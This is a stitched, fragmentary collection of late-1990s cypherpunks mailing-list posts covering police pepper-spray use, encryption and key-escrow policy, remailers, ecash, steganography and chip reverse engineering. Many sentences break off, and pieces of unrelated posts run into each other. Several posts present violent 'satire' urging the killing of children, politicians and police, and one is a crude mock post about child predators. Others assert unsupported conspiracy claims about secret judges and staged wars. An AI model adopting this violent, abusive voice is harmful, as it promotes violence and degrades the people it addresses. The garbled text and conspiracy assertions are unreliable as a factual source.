or to pursue other solutions.
Given that the governments of the world are the source of nearly all
privacy problems, it seems unlikely that an appeal to government is
likely to be productive.

Indeed, many of the so-called 'off-topic' missives sent to the CPUNX

"face value claims of" authority/identity.
  e.g.
  Why do the average citizens put up with behavior from legislators and

  It is because of the 'forged keys' of authority that they have uploaded to the mainstream media servers...

  ...and because of the public misconception that a 'valid key' confers
some kind of real authority or integrity on its owner...

The manufacturer of the pepper spray used warns that it should be
used from a minimum of three feet away, as closer use will result
in tissue damage.
  Videos show the police spraying it directly in the non-violent
demonstrators eyes from inches away.
  Naturally, even if they shot the non-violent demonstrators in
the eye from inches away, with their guns, they would be provided
with a taxpayer-supported legal team to claim that the officers were in fear for their lives from seated, handcuffed, unarmed,
non-violent demonstrators.
  If I trespass on Tim's property, I would fully expect him to
deal with me in a manner consistent with his declared intentions.
I would expect the same from those who claim to be bound by the
same rule of law that they _force_ on the citizens.
  This non-violent demonstrators were willing to accept the agreed
upon punishment/cost of their actions in protest of the actions
of their public servants. Their public servants, as usual, chose
to to act in the manner of savages who are incapable of holding
to the rule of law which they use to justify their confiscation
of the citizen's right to bear arms in the face of tyranny.

Chemical Maceï¿½,
A trademark for a mixture of organic chemicals used in aerosol form as a
to disable with intense burning pain, blepharospasm, acute bronchitis,
respiratory irritation.
                   -- "American Heritage Dictionary", 1991
  i.e. - The police in Humboldt county used 'weapons' against peaceful
Mace is an aerosol weapon (tear gas) that is used to disable violent
  i.e. - ibid.
What Is Mace Made Of? (Formulations)
     CN (Original Mace)      CS      CN/OC Blend      CS/OC Blend      OC 5.5%      OC 10%      OC Foam CN -- Chloracetophenone (Lacrimator Agent)
     Relatively toxic
     Fast Acting (Upper Respiratory Tract, Lachrymatory, Eyes)      Irritating to the Skin (burning and itching sensation) CS -- Orthochlorbenzalmalononitrle (Lacrimator Agent)
Extreme burning of the eyes, and flowing tears      Stinging sensation on all moist skin      Tightness in the chest and throat (Lung and Bronchial Irritant) OC -- Oleoresin of Capsicum (Inflammation Agent)
     Severe involuntary closing of the eyes/Spasms of Eyelids      Severe burning of the eyes, and flowing tears      Intense pain on all exposed all skin   i.e. - The police *sentenced* unconvicted citizens to receive
the *punishment* of *severe* burning and *intense* pain by use
of *chemical warfare*.
How Does It Work?
CN and CS are both irritants and lacrimator agents...if it gets into the respiratory tract is causes severe coughing and choking.                                      ^^^^^^
For CN and CS to work effectively the person being sprayed must be able to feel pain
                ^^^^
OC on the other hand is a inflammation agent...it causes...the entire respiratory system to seize up and go into spasms.
  i.e. - Severe Pain and Spasms == Punishment
Any time you use Mace (or any kind of weapon) be prepared to defend yourself in civil or criminal court.
Spraying someone with Mace is (by legal definition) an assault,                                ^^^^^^^^^^^^^^^^^^^     ^^^^^^^
and you must be legally justified to spray someone.
You can easily go to jail or get sued for misusing a defensive ^^^^^^^^^^^^^^^^^^^^^^^^^             ^^^^^^^^^^^^  *^^^^^^^^^*    spray or any level of physical force.
  i.e. - If you are a *citizen-unit*.
Keep in mind that the use of any kind of defensive weapon could result in death.   i.e. - Do the police give a fat rat's ass if they kill the
      citizens by using *chemical warfare* when it is not
      necessary, except to perhaps 'teach someone a lesson'
      by sentencing them to be punished before trial? No.
When to Use - Use of Force Ladder
     Confrontational Avoidance      Physical Presence      Key Verbal Skills      Body Language - Assault is Imminent/Possible      Defensive Tactics/Martial Arts/C&R/Open Hand      Chemical Weapons      Impact Weapons      Edged Weapons      Firearms   i.e. - The word "defensive" is used, time and time again in this
      evaluation of the proper use of mace. The words *punishment*
      and *expediency* are, not surpsingly, absent from this       discourse.
[If you follow the links to the government material on the use of  these deadly chemical weapons, you will find constant references
 to "restraint" of "aggressive" individuals, and as an "alternative"
 to "physical violence."]

  To tell the truth, I really don't have any problem with _you_ doing
so. I _would_ have a problem with the cops doing so, however, which is

  It may be the policeman's job and/or duty to arrest and imprison the
people involved, but it is in no way their duty or right to _punish_
the people by invoking a level of violence which is not necessary to
accomplish the job.
  I don't really care if it is _difficult_ for the policemen to deal
with the physical details of imprisoning the people. And I don't have
a lot of sympathy for the protesters if they get bumped and bruised
in the process of the police honestly doing their job. However, it
is unconscienable for officers to inflict pain and suffering on the protesters for no other reason than to punish them for making
the policeman's job difficult and defying authority.

  without giving up conspirators yet-to-be-born, as promised.
  (Known as "the unborn" by the spook-oriented.)
c) The narcs have a 'done deal' with the individual, and need to
  postpone any signs of a 'sweetheart deal' so as not to spook
  (pardon the pun) the targets of an ongoing investigation.
d)  The warrants are in the mail and the individual's sentencing
  is dependent on future testimony/cooperation.
e)  The spooks are having trouble finding the right combination of
  chemicals to twist the individual's mind into a willing vessel of
  their mind-control plans for them as a suitcase salesman.
  Delay is usually used when they've gotten some backwoods legal
aide dupe to sell their client down the river unwittingly, and
they want the individual to spend as much time as possible in
jail before finding out at his or her sentencing that they have
gotten totally screwed and they go out and get themselves a good   Not the case, here. Jim's lawyer knew where his future career
was buttered. Nobody unwittingly lets their client get stomped
on that badly and refuses offers of outside assistance, without
being a part of the plan.
  Nope.
  Nope. But they could very well be trying to manipulate him into
turning on others, OR (listen closely...) 'pretending' to turn on
others without really giving them up, and turning his own past
non-crimes into real-crimes in the process.
  e.g. - "I don't know if John Young was *serious* about what he
said in that email to me, but I could find out, once I am out of
here."   This is a true toilet-plunger maneuver, with the individual led
to 'making' his past actions criminal with the statements he makes
today. 'Wise guys' are susceptible to this, being too smart for
their own good, and thinking they can walk with the Devil as far
as the Bridge. a) A definite possibility, but extremely difficult to confirm.
McVeigh, for instance, did everything but wave a red flag to get
his ass picked up. Tough to tell a 'death wish' from personal involvement in 'the plan.' b) Jim and Tim were both 'led to believe' that they were 'part of
the plan' and will continue to believe so until it becomes obvious
that the burning coals being prepared in the pit are for them, at
which time it is a little late to start saying, "Actually, the
*real* story is..."
  Not *that* court. That one, like the one in Denver, is a *home*
court, with *home* referees and officials.
  It's tough to win in Vegas, unless you're *from* Vegas.
(Nobody calls from Vegas just to say "Hello.")

Hi. I'm only twelve, but I'm a real dork, and nobody will talk to me
in the chat rooms.
I was watching 20/20 tonight about sexual predators on the internet
and they had some really cool tips about how to prey on young children.
{If only one child is raped and murdered by sexual predators who learn
 how to use the internet effectively, it will be worth the time and
 trouble for those producing the show.}
Anyway, I have a question for you.
Would I get more people talking to me on the chat lines if I say that
I am a twelve year old interested in sex, or if I say that I am a
sexual predator interested in meeting young boys?
I have never talked to a real FBI agent before and I know I would get
to meet some if I said I am an old fart who wants to bunghole young
boys but they would probably tell my parents, wouldn't they?
I bet I could get a lot more people to talk to me if I told them how
old I really am and that I want to do dirty stuff with old farts. I bet
I could get a lot of free stuff, too.
What do you think? I am asking you because my Doctor in Forest Hills
says you guys know about that stuff. He's not a real doctor, but he
meets me in the park, where I can smoke, so I like him. He says I don't
have prostrate cancer. Boy is that a relief!
I met him in a chat room. He said, "I'm from the cypherpunks, and I'm
here to help you." I found out that his name isn't really John Gilmore,
it's some kind of foreign name, I think. When I asked him if he was
a "real" doctor, he said, "No, but I have an honorary Doctor of Love
degree that was bestowed upon me by the grade four class at the Forest
Hills pubic school." (I think he was making a joke. :?)
I thought I could get people to talk to me on the cypherpunks list,
since you guys are cool, but everyone there thinks I am an asshole,
too. I think I am going to change my name from TruthMonger to something
Do you think that would help?
I spell pretty good for a twelve year old, don't I?

   Encryption Tops Wide-Ranging Net Agenda in Congress
   By JERI CLAUSING
The word encryption traditionally conjures images of spies and sophisticated international organizedcrime rings. But with the dawn of the Internet, it is also the key to private communication and secure
business transactions. And while Clinton on July 1 took a very public stand for a tax-free, self-governed Internet, his administration is pushing to create a key-recovery system that would keep encrypted codes on file for law enforcement officials to access.   Translation~~These ratfuckers are trying to keep a low profile until
they can get all of their draconian legislation passed, at which time
the sheeple will find out why the "rubber boots" rider was attached to
the legislation.
  How long before the Great InterNet Tax Avoidance Crisis (TM) requires
them to access the records of all companies and individuals in order to
make certain that the royal "we" are not "cheated" by our evil fellow
"Law enforcement needs to have a system for immediate decryption" when a judge determines it is likely that crime is being or is about to be committed, Freeh told the Subcommittee on Technology, Terrorism and Government Information. "We should also look at whether network service
providers should have a system for immediate decryption." Translation~~"Just as we need to be able to beat the citizens and shove toilet plungers up their ass if we have reason to suspect that they
have knowledge of a crime in their mind."
  Freeh wants to make certain that the citizens don't have the same
ability as the Whithouse, the Department of Justice, Congress, etc.,
to LIE to the courts, to the people, to each other. So if _we_ steal
a private company, murder members of a religious sect, get filthy
fucking rich on inside deals, then _we_ will go to jail.

Petitioning to Make Special Patent Applications Relating to
Inventions For Countering Terrorism
New patent applications are normally taken up for
examination in the order of their effective United States
filing date.  However, the Commissioner may provide that a
patent application will be advanced out of turn for
examination if a petition to make the patent application
special under 37 CFR 1.102(c) or (d) is granted.
On July 31, 1996, Vice President Gore stated that �[i]t is
imperative that those seeking to prevent terrorist
activities have all of the tools necessary to accomplish
their task.�  In view of the importance of developing
technologies for countering terrorism and the desirability
of prompt disclosure of advances made in these fields, the
Patent and Trademark Office is establishing a new category
for petitions to accord "special" status to patent
applications relating to counter-terrorism inventions.
International terrorism as defined in 18 U.S.C. 2331 is
�activities that
(A) involve violent acts or acts dangerous to human life
that are a violation of the criminal laws of the United
States or of any State, or that would be a criminal
violation if committed within the jurisdiction of the United
States or of any State; (B) appear to be intended (i) to
intimidate or coerce a civilian population; (ii) to
influence the policy of a government by intimidation or
coercion; or (iii) to affect the conduct of a government by
assassination or kidnaping.�
The types of technology for countering terrorism could
include, but are not limited to, systems for
detecting/identifying explosives, aircraft sensors/security
systems, and vehicular barricades/disabling systems.
Applications which are made special will be advanced out of
turn for examination and will be treated as special
throughout their pendency by the Patent and Trademark
Applicants who desire that an application relating to
inventions for countering terrorism be made special should
file a petition, with the fee under 37 CFR 1.17(i) which is
presently $130.00, requesting the Patent and Trademark
Office to make the application special.  The petition for
special status should be made in writing, should identify
the application by application number and filing date, and
should be accompanied by a statement explaining how the
invention contributes to countering terrorism.  Such
statement must be set forth in oath or declaration form
unless it is signed by a registered practitioner.  The
petition will be decided by the Director of the patent
examining group to which the application is assigned.
This new category for a petition to make an application
special will be added in the next revision of the Manual of
Patent Examining Procedure (MPEP) to the other categories
discussed in MPEP section 708.02.
Questions concerning this notice should be directed to
Magdalen Y. Greenlief, Office of the Deputy Assistant
Commissioner for Patent Policy and Projects, (703) 305-8813.

Stanford Newspaper Promises to Help Chelsea Clinton Keep Low Profile
   AP
   08-SEP-97
   STANFORD, Calif. (AP) Don't look for news about Chelsea Clinton in
   Stanford University's school paper: The editor is promising to treat
   the first freshman like any other student.
   Chelsea, accompanied by her parents, is expected on campus Sept. 19,
   when 1,600 first-year students move into their dormitories and begin
   several days of orientation.
   Like the mainstream media, the Stanford Daily plans to cover the
   Clintons' arrival and their participation that day at a welcoming
   ceremony for freshmen and their parents.
   But after that, said Carolyn Sleeth, the Daily's editor in chief,
   Chelsea "will be treated by us as a student, a regular student."
   That means her classroom and social life will largely go unreported.
   "Of course, if she involves herself in a newsworthy event, we'll cover
   it for example, if she founds a Stanford Democratic Club," Sleeth
   said.
   On the other hand, the student editor said if Chelsea were to get a
   speeding ticket or violate some minor campus rule, it would be
   ignored.
   "We wouldn't do a story if another student got a speeding ticket,"
   Sleeth said.
   Sleeth also said a gag order of sorts will be imposed on Daily
   employees, barring them from talking or as she put it, "punditing"
   with the "outsider press" about Chelsea. Anyone who does so will be
   fired, she said.

(09/09/97; 12:00 p.m. EDT)
   By Douglas Hayward, TechWire
   GENEVA -- Internet taxes are inevitable, according to the man dubbed
   the "Father of the Net." The only way to avoid global chaos is to
   create an international agreement on how to do it, added Vint Cerf at
   a meeting of the Internet Society here. Cerf co-developed the
   TCP/IP[LINK] protocol on which all Web and Net transaction depend.
   ...Taxation of the Internet, also called "bit taxes," must be well
   planned, Cerf said. "And it must also be thought through on a global
   scale -- not parochially," he said. In the United States. alone, there
   are 30,000 taxing authorities that might be interested in taxing
   transactions on the Internet, said Cerf, adding that right now, there
   is no way to determine which of those authorities should have
   jurisdiction over a particular transaction.
   ..."If something is becoming an infrastructure that is important for
   people's daily lives, then governments will have the right to be
   concerned about the public's safety and well-being," Cerf said. "When
   you build roads, you make rules about how people are to behave on
   these roads, in order to protect people." TW

Read it and think about it...
This kind of bureaucratic dildo is a subtle way of affording the Lying Nazi Fucks (TM) in power a way to _interpret_ the law unconstitutionally
without having it subject to "judicial review."
Ipso facto, you are mucho fuckedo by an unconstitutional interpretation
of a constitutional law.
Add to the above, the fact that unelected semi-secret committees of administration appointees will be exchanging bum-buddy favors with
the people doing the interpreting, and you will find a set of 'established' procedures--from the White House down to the lowly
clerk that stamps "Denied" on your application to speak your native
tongue during overseas phone calls--which will _support_ the fascist's
case if you ever _do_ manage to get them into court.
(Much like the post of our Cpunk avon lady who sent the CFA post down
showing how the Alberta lawyer got suckered into comparing his stance
against gun registration to an 'established' unconstitutional law
against handgun registration.)
The deciding factor in a case such as this, from my experience, is
when the government whines about the terrible burden they would be
placed under if they were forced to go out and by an "Accepted"
rubber-stamp, at which point the judge decides that this would
take away from the available funds for nuclear warheads, and then
National Security would be compromised.

@_subject: Bullshit! / Re: in defense of Lon Horiuchi 
Personally, I think you are both 1/2 full of shit, for a grand total
of Bullshit!
It is fortunate that, in my position of Chief CypherPunks Spokesperson,
I am able to set you both right in the interests of Truth, Justice, and
an Uzi in every pot (bag).
I have no problem with people who enter law enforcement with the genuine intention of attempting to serve the ends of equal justice
being applied among the citizens in a reasonable manner.
I *do* have a problem, however, with the fact that the high level
of integrity and responsibility that *should* go hand in hand with
that manner of _public_service_ has in many ways been abandoned to serve the convenience (*not* "legitimate needs") of law enforcement
We all know that if we had approached the FBI before they found the
guy, and *guaranteed* that if they gave us six men for thirty days
we would bring their man into custody, they would gladly have given
us what we asked, if the alternative was to let him go free.
When it comes to avoiding the loss of innocent lives, however, the
motivation to "do whatever it takes" seems to be more lacking. To
me, this is unconscienable.
A good example is the many lives that have been lost over the years
in dangerous high-speed chases over nickle and dime bullshit, merely
because the 'good guys' main interest was to get a good adrenaline
rush in their pursuit and capture of their prey, however small-fry
that prey might be.
Only when enough blatantly senseless tragedies had taken place, was
there any attempt to introduce the discretion of the "reasonable
man" in the slightest manner such as it is applied to the normal
citizens in the judgement of their actions according to the law of
the land.
The fact that the victims were killed by a 'missed' shot which went
through a door, does not lessen the responsibility of the agent who
chose to use deadly force to understand the potential of the weapon
he was using.
If Zooko shoots a cop by firing into a steel wall with a cannon, he
is unlikely to get cut much slack by saying, "It never occured to
me that could happen."
I don't know the FBI agent who fired the fatal shot. He may be one
of the nicest and most well-intentioned people in the world. However,
I have personally known too many law enforcement personnel who had
far more interest in exercising egoistic authority, or getting an
adrenaline rush from risky situations, than in bringing the end goals of law enforcement to a safe and just end for all involved.
I find it hard to believe that the end result of the standoff was
not the result of impatience and convenience rather than the way
things truly needed to be.

Zooko Journeyman quoth:
About the best spin that you can put on this is that the agent was
trying to shoot (again) the retreating Randy Weaver and showed an
utter disregard for the safety of the others in the cabin; who were
known to include women and children.
This is the point.  Not that all Fibbies are demonic baby-killers
but that the arrogance of their agency and its government allow them
to mark someone--Randy Weaver or even Jim Bell--as 'bad guy' and
call out unreasonably huge campaigns against them.  Once so marked,
the "victim" is then helpless, completely without recourse, the
"justice" system by then having been poisoned against them by the
Fibbies and the prosecutors.  [For those that survive long enough
to have an encounter with the justice system.]
I don't find that at all reasonable; since Weaver was on his own
property, minding his own business before agents started shooting
at him.  Yes, I know he was wanted for failure to appear for a
court date--that hardly justifies the whole exercise.
Perhaps he didn't chuckle gleefully, but he obviously didn't
show much regard for the Weavers' lives either (/before/ Vicky
Weaver's death that is).  BTW, neither I nor anyone else has
accused him of killing a toddler.
Yes, I can see why you would recognize such a smell.

After giving careful consideration to the amount of press coverage
dedicated to the bombing of the Oklahoma City Federal Building, and judging the proportion of outrage over the deaths of the children in
the daycare center compared to the amount of outrage over the remaining
victims, I have come to the conclusion that in the interests of saving
lives terrorists and psychos should be encouraged to murder the youngest
children possible.
  While my studies are preliminary, they indicate that terroists and
madmen would only have to kill half as many people to achieve comparable
results in the arena of publicity and public attention if they were to
confine their slaughter to young children. This figure declines further
if the children are white, and even further yet if they are cute.
  By promoting cute young white children as the target of preference
for terroists and crazy people, we could save innumerable lives each

It is quite probable that this has been said before.  In case it hasn't,
however, I feel compelled to point out that mandatory key escrow/recovery
could likely mean an economic disaster of unimaginable proportions.    Okay, key escrow, whether by the goobermint or a contracted third-party,
is beginning to scare the living crap out of me.  Okay, let's assume that
the ammended SAFE passes and is promptly signed into law(despite what the
administration says, I don't think anyone believes for a second that it
would be signed without hesitation). It's a simple matter for the Commerce
Dept. to modify their review criteria to specify that the key
escrow/recovery feature be enabled and that the end user not be able to
disable it.
   This obviously doesn't affect anyone who can get their hands on the
source and comment out a line or two, but think about what happens with
big corporations, especially financial ones.  It's highly likely that a
good number of them will use crypto software just the way Big Brother
would like them to, happily sending their keys off so that our friends in
Washington can keep them nice and safe.
   Now think about this:  You're Joe Random Govt. Worker at the official
secret key repository, and there's a budget crisis going on - instead of
paychecks, you're getting I.O.U.'s.  Your terminal has access to
thousands, perhaps millions, of secret keys.  You grab one of CitiBank's,
forge a few transactions, and 30 seconds later your Swiss bank account is
a few million dollars fatter and according to the digital signature, the
transaction originated in L.A..
   Of course, one doesn't even have to be an underpaid govt. worker to
join in on the fun.  Just find a buffer overflow in the key repository's
daemon software and trick it into tacking on a few secret keys with its
"Big Brother thanks you for your cooperation." packet.  Considering that
even the CIA can't keep their severs secure, why should ANYONE, even
thouse naive enough to trust the govt. to respect their privacy, ever
trust such a corrupt and insecure organization with their encyption keys.
   Along the same lines, it's almost certain that someone is eventually
going to fat-finger some code and keys are going to get sent in the clear,
posted publicly, or something equally bad - with the government running
the "key management infastructure", it'll probably be a 12 year old kid
who got bored with Minesweeper who causes the global economic collapse.

We could kill them with hammers until we killed enough that they passed

have to use selective enforcement against just blacks and longhairs

Am I ready to run for public office, or do I need to get stupider?
If so, then I propose that we start killing people by filling their
mouths with dirt, then we can pass dirt registration laws. Then we can
kill people by filling their lungs with air until they burst and we
can pass air registration laws. Then we can leave people out in the

If a thousand of us could kill as many people as we could until we got

we would all have to be released as prisoners of war, right?
We could all be privates. They can't blame privates because they have
to follow orders.
The guys in the small country could make old guys who were dying soon
the leaders, and then when it was time to quit, they could overthrow
them and get US government aid. They could set the old guys trial dates
for two years down the road and then send them home to die.
I saw a guy get killed once and they told the guy who killed him that
he shouldn'a done it and they sent him home and said we'll call you
and then they took the dead guys sister to jail because she wouldn't
stop saying fuck.
When they were taking her away I told her she should kill the cops and
then go home and wait for them to call.
How about if we made a law that you had to kill the president and your

you sir or ma'am? Or who forgot your birthday?
We could save a lot of money just by putting all the politicians who are
running for office on a stage and then killing them at random until we
had the right number left. Then they would have to think about if they
really wanted it.
How about if we let people be elected on a first-come first-serve basis
but then we could vote to kill them any time we wanted. Think they would do things to make us not want to kill them instead of the other
way around like it is now?
How about if we killed all of them and just pretended there was someone

One other option for non-destructive reverse engineering is to drive Vcc

substrate is often grounded and introduces a large capacitance) This produces a general `map' of the chip, although many of the
frequencies will overlap and be indistinguishable.  To remove the unwanted
noise, it is necessary to damp out the parts of the chip that you're not
interested in.  There are a variety of ways to do this but the one of the
easiest is with the magnetoresistance effect.  Disk drive rw heads work
well for this. (it's usually better to magnetize the whole chip and then
unmagnetize the part you want to look at.) Input pins are most likely connected to an insulated gate, but this will
act like a capacitor, allowing ac into the channel, so we can probe these
to see where they go.  Newer chips have filters on the inputs which makes
this more difficult. once you have selected a target area, turn on the transistor(s) by any of
the usual methods (uv light, electron beam, external e-field...if you're
poor you could try pumping the substrate to induce latch-up, though this
isn't very `selective' in what it turns on) Two main problems with this techinque:  One is that the relevant
resonances are on the order of 10-100 GHz.  Obviously you are not just
going to plug that into your average scope and expect it to work.  The
usual advice is to maintain a reference oscillator and measure the
interference with respect to your `probe'.  If you have access to some of
the newer GaAs amps, you can modulate the signals and then measure the
lower sideband. The other problem is the finite resolution (even if you have a really good
magnetic head you just can't get close enough to the surface without
destuctive techniques.)  To a large degree, you have to `brute force'
guess, and see what model best fits the data.  I shouldn't have to explain

Perhaps we can elaborate on this.  Judging from their actions, what
they want is a full blown police state.  They've seen the product, now
they want one of their own.  This is obvious to everybody on this
list, but sometimes people are coy about it, probably in an effort to
appear to be "legitimate".
This transcends the issue of crypto, although the problem will be more
manageable if the use of crypto remains legal.
What we are seeing is the fight for survival of the institutions
created during World War II.  Their only purpose now is self
promotion.  This was universally recognized ten years ago when the
Wall fell, but somehow the "peace dividend" never materialized and
they got another trillion dollars out of us.
We can look at Russia and see just how hard it is for a society to
free itself of these sorts of institutions.  How much of the Russian
"Mafia" is composed of fragments of the KGB?  This story can be read
again and again throughout history.
What is different in 1997 is that the technology of mass surveillance

  Also, you are not likely to see a FISA judge's name on a warrant.
Instead, you will see warrants by regular judges which are backdated
to dates such as, say...March 28 at 9:02 a.m.
  There are a variety of court systems within which they have the clerks
regularly 'skip' certain document numbers, leaving them with hard to
trace back-dated paperwork capabilities.
  This is a 'Democracy', which is why, in addition to secret police,
we also have 'secret judges', and 'secret executioners'. (Do we also

This was just done manually, so it's pretty crude.  It would be easy
to write a program to display any message desired.  People could get
in the habit of sending long vertical stereograms saying "GO GIANTS"
or "MICROSOFT SUX" or whatever they felt like at the moment.  The
program could either generate its own random numbers or else suck
in random data from a disk file.
In this case, if you take the left block and reformat it so that it can
be base64 decoded, you will see a short message.  (Unix users can
pass the left block through "mimencode -u".)  In a real stego
application the message would be encrypted in 'stealth' form so it
was indistinguishable from random bits to anyone who did not hold
the decryption key.
This could even catch on as a legal "thumb your nose at the spooks" fad,
people adding random sterograms at the end of their messages.  You
could even have an active .sig which had a constant message but used
different random characters each time.  They wouldn't actually be sending
anything but there would be no way to be sure.
Some people say they'll just forbid transmitting data that looks random,
but realistically, that would be very unlikely to happen.

Or another Lusitania.  The German government during World War I had a
policy of sinking any ship carrying armaments to Britain.  While the
Lusitania was a civilian ship, the allies were secretly loading it
with ammunition.  This was known to the German government which
announced that it would attempt to sink the ship.  This was advertised
in New York newspapers by the German embassy in the weeks before the
Lusitania's departure.
The German torpedo appears to have set off the munitions in the hold
which caused the ship to sink more quickly, magnifying the loss of
life.  Ironically, while the allies were responsible for using the
civilians on board as shields, the Germans were held responsible for
the deaths.  This was used as a propaganda tool to persuade the
American people that the country should enter World War I.
By an odd coincidence, Franklin Roosevelt and Winston Churchill worked
together on the Lusitania project, foreshadowing their later work
Many U.S. wars have started with similar incidents.  The
Spanish-American War started when a U.S. naval ship (The Maine) blew
up in Havana harbor.  Curiously, no officers were on board at the time.
Some suspect Pearl Harbor was managed to maximize the shock of the
American people.  There was also an incident in the North Atlantic
with a German ship which was used to justify U.S. involvement in the
European war.
And let's not forget the Gulf of Tonkin incident which prompted the
Congress to grant the President sweeping powers.
The only real question is whether the stakes are high enough at this
time to justify some sort of provocative incident.  It seems
reasonable that the bureacracies of Russia and the United States would
recognize their common interest against the people of both countries
and the whole world.

You better learn that Congress is not there to support the Constitution.
Any part of it.  It's not in the part of their job description that gets

Washington May Crash the Internet Economy
By Jim Barksdale
The U.S. computer industry is the envy of of the world. But it may not be long before we are asking ourselves: Why did we let our dominance in the software business slip away to competitors in other countries? That could well be the consequence of encryption legislation proposed by FBI Director Louis Freeh and supported by key congressional Republicans and members of the Clinton administration.
Encryption is simply a mathematical way to scramble (encrypt) and unscramble (decrypt) digital information during transmission or storage. It is increasingly used to protect not just personal communications and medical and financial records, but also all the intellectual property businesses maintain on computer networks.
Protecting this valuable information has become a highly competitive business around the globe, yet U.S. industry has been limited in how it can compete, because U.S.-based companies are not allowed to export anything stronger than 40-bit (or in some cases 56-bit) encryption. (The strength of encryption is largely a function of the length of its software "keys" measured in bits, the zeros and ones that comprise computer data.) Foreign producers, however, can distribute encryption products with 128-bit key length, so-called strong encryption, which is considered unbreakable by today's computing standards.
The FBI has proposed to worsen this situation by also limiting the use of strong encryption in our domestic market. The FBI's proposal, in the form of the Oxley-Manton amendment to a House bill originally drafted to liberalize export controls on encryption, would require makers of encryption software to provide the government with immediate access to the information in a computer or network without the knowledge of the owner or user of the computer. We could still provide encryption products, but their value would be compromised considerably by a "backdoor" for law enforcement agencies to access information in the computer.
We understand and share the FBI's concern about terrorists and other criminals using encryption to protect their activities from law enforcement surveillance, but the FBI proposal does not solve the problem. The criminals will still be able to buy advanced encryption technology outside the U.S., where it is freely available today.
The encryption plan will cause bigger problems for law-abiding companies, however. We have some of the best software engineers on the planet at Netscape, but we simply do not believe it is possible to comply with the proposed FBI standard. If it became law, the federal government could put us in jail if we could not guarantee immediate access to data in everyone's computer. This could only result in having us remove valuable information security features from our products. But the Internet needs just the opposite: more security.
As legal scholars have pointed out, the FBI proposal poses grave constitutional concerns. An additional problem is the likely result of the FBI plan: more crime. By taking away encryption as we know it today, the FBI proposal would expose computer users to assault by hackers intent on economic espionage, blackmail and public humiliation. At a recent congressional hearing, one witness testified that with $1 billion and 20 people using existing technology, he could efffectively shut down the nation's information infrastructure, including all computer, phone and banking networks. Another witness said he could do it for $100 million.
The solution is to ensure that our public and private infrastructure is secured through strong encryption and other means. The FBI cannot catch every hacker. But there will be fewer and fewer of them trying to penetrate sensitive networks if those networks are adequately protected and communications secured through the use of strong encryption.
Without the privacy and security that strong encryption guarantees, consumers and businesses will refrain from using the Internet, greatly damaging our economy. The Internet already contributes 1.5% to the U.S. gross national product. Estimates suggest the total value of goods and services traded over the Internet could reach $8 billion this year and $330 billion in five years. The U.S. holds an estimated 75% of the global software market and roughtly the same share of the global Internet economy, according to studies by the Global Internet Project, an international trade group.
The FBI proposal, if adopted, could end this economic phenomenon overnight. The good news is that the House Commerce Committee voted against this proposal by 35-16 on Wednesday. However, similar amendments have already been approved in the House National Security and Intelligence committees. It's now up to the House Rules Committee-whose charman, Gerald Solomon (R., N.Y.), favors limiting encryption technology-to reconcile the votes of the five committees that have considered various forms of the bill. Perhaps most ominously, the Drug Enforcement Administration and the deputy Treasury secretary for financial crimes yesterday announced their support for the FBI's proposal.
What we need instead is a voluntary approach, U.S. companies should continue to cooperate with law enforcement authorities in provideing technological expertise and emergency assistance. Because companies like mine are committed to dooing this, our country will be more secure. If government policies end our leadership in encryption technology, where will our law enforcement and national security officials turn for help?

This slur is unwarranted.  The ACLU has a long tradition of defending

My personal favorite is the case of the Jehovah's Witnesses in the
1950s.  The Witnesses believe that they cannot honestly pledge
allegiance to the flag.  They believe that they owe allegiance to God.
Were the government to act in a way that was other than God's

This had to go all the way to the Supreme Court and it was the ACLU

The ACLU can be fairly criticized for their general sympathy to the
causes of the Democratic Party.  This would be acceptable if they were
honest about it, but they are not.
Likewise, while they may have no official position on the 2nd
amendment, you will generally find members of the organization are
staunchly opposed to it.  Again, no real tragedy except that their
advertising proclaims their organization is the only one in the United
States devoted to protecting the Bill of Rights.  Unfortunately, it
just isn't true.  They protect the amendments they like and ignore or,
in the case of the 2nd amendment, undermine the rest.
Most people probably don't know how the ACLU is structured.  There is
a national organization and then a variety of state level chapters
which have a great deal of autonomy.  The chapters do a lot of the day
to day work helping people who are getting severely screwed by their
local governments.  (There was a great case about ten years ago
involving a state sponsored alcohol rehabilitation program.  Once in,
it was understood that participants wouldn't be allowed to leave for
about 60 days so they could really dry out.  It seems there was a
little funding program and the facilities provided couldn't handle all
the people who applied.  So, they threw a bunch of the women in jail!
The ACLU chapters handle cases like this all the time.  They don't get
much credit for it and nobody else does much of this work.)
However, the chapters tend to be a little more squirrely than the
national organization.  Usually when you hear about some flaky case
"The ACLU" was pushing, it will turn out that a chapter was behind it.
About five years ago the Southern California chapter campaigned
against California Proposition 165 because it would cut welfare
benefits.  A friend and ACLU member complained that this was not a
civil liberties issue and they should not be campaigning for the
Democratic Party.
This letter came back:
While the ACLU is great in certain ways, so far as most cypherpunks
are concerned I recommend considering them to be uncertain allies.
It's sad.  If they were truly a multi-partisan organization which was
devoted to the Bill of Rights they would be many times more effective
than they are currently.  In principle there is no reason why the NRA
and the ACLU shouldn't be the same organization except the membership
of each brings too much baggage to the table.

@_subject: Remailers and ecash 
1. You should be looking at the marginal cost of adding money
collection to a remailer.  It isn't fifty thousand dollars, it's
calling Mark Twain Bank, downloading the ecash software, getting it
set up, and then hooking it into your remailer.  (This would be a good
way for the EFF to collect donations, wouldn't it?)
2. Remember that this could be started as a side business by somebody
who has already paid the fixed costs.
3. $50,000 is nothing for a high tech venture, anyway.  If there is
any indication that security services could be a real market, the
investment money will flow like tap water.  (People love web
businesses that are really generating hard cash.)
When I look at Raph's statistics I don't see a successful remailer
network.  Now, there is some question about what his numbers mean, and
there are some questions about the causes, but it is believed (not
just by me) that the remailers lose messages and that they are delayed
by reasons other than waiting for reordering queues to fill up.
Yesterday, I think you said that if you noticed a problem with your
remailer at 1am, you would deal with it in the morning.  You are a
volunteer and that is perfectly reasonable.  But, if your remailer was
related to a flow of cash, you might find it worthwhile to stay up
another 30 minutes.
Also, there are really only a few remailers out there.  If there was a
market in place, we would see some more entrants, both as service
providers and as customers.  There are lots of people out there who
would be delighted to operate a remailer for $5000/year.
It's a great product.  You haven't lived until you've e-mailed money.
I don't think you have to pay this fee with every account.  (Even if
there is a $10 fee, I would think my $50 would help defray the
The way it works (in e-mail) is you generate a block of ASCII text
that looks sort of like a PGP message and give it to the person you
want to pay.  You can make the payment out to them in particular, or
you can make it out to whoever takes the certificate to the bank
For ease of use, remailers should use the latter method.  This also
means that you wouldn't have to have a merchant account (which might
be more expensive) to accept cash with your remailer.

@_subject: Remailers and ecash 
Good point.  I appreciated the following detailed discussion.  But, I
disagree on a few points.
An economist was walking down the street and saw a hundred dollar
bill.  The engineer with him snapped it up.  Later, the engineer asked
